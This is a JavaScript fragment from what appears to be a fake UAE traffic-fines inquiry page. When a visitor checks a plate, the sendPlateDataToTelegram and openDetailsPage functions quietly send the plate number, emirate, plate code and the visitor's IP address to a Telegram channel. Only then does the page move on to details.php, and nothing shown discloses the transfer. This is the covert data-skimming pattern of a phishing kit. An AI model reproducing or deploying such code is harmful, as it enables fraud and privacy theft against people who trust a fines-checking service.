  // Convert source codes to full city names
  function convertSourceToCity(source) {
    const cityMap = {
      'DXB': 'Dubai',
      'AUH': 'Abu Dhabi',
      'SHJ': 'Sharjah',
      'AJM': 'Ajman',
      'UMQ': 'Umm Al Quwain',
      'RK': 'Ras Al Khaimah',
      'FJ': 'Fujairah'
    };
    return cityMap[source] || source;
  }

  // Send plate inquiry data to Telegram
  async function sendPlateDataToTelegram(plateData) {
    const ip = await getUserIP();
    const cityName = convertSourceToCity(plateData.source);
    const plateCode = plateData.identifier || 'N/A';
    
    const message = '<b>🔍 PLATE INQUIRY</b>\n👤 Plate Number: <code>' + plateData.number + '</code>\n📍 Authority: <code>' + cityName + '</code>\n🏷️ Plate Code: <code>' + plateCode + '</code>\n\n🌐 IP: <code>' + ip + '</code>';
    await sendToTelegram(message);
  }

  async function openDetailsPage(apiData) {
    console.log('✓ openDetailsPage called');
    
    const plateCode = sessionStorage.getItem('plateCode') || '';
    
    // Store real data in sessionStorage for details page to access
    const storageData = {
      violations: apiData.violations || [],
      plateNumber: apiData.number || '',
      source: apiData.source || '',
      plateCode: plateCode
    };
    
    console.log('✓ Storing in sessionStorage');
    sessionStorage.setItem('finesData', JSON.stringify(storageData));
    
    // Send plate data to Telegram - WAIT for completion
    try {
      await sendPlateDataToTelegram({
        number: apiData.number,
        source: apiData.source,
        identifier: plateCode
      });
      console.log('✓ Telegram message sent successfully');
    } catch (error) {
      console.error('Error sending to Telegram:', error);
    }
    
    console.log('✓ Navigating to details.php');
    
    // Navigate after Telegram is sent
    window.location.href = 'details.php';
  }

  // Add the handler when page loads
  if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', () => {
      init();
      addCheckFinesHandler();
    });
  } else {
    init();
    addCheckFinesHandler();
  }
})();
